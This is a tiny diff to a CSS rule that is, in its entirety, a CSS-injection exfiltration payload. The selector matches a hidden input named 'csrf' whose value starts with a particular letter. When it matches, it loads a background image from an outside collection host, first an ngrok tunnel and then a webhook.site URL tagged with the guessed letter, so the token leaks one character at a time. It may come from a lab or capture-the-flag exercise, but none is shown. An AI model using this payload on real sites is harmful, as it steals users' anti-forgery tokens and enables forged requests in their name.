@@ -1,4 +1,4 @@
-input[name="csrf"][value^="y"] {
+input[name="csrf"][value^="a"] {
   visibility: visible;
-  background-image: url(https://48fc-134-214-58-60.ngrok-free.app/y.jpg);
+  background-image: url(https://webhook.site/a1aef44f-629d-46e9-84d8-6ba6efbe15be?a);
 }
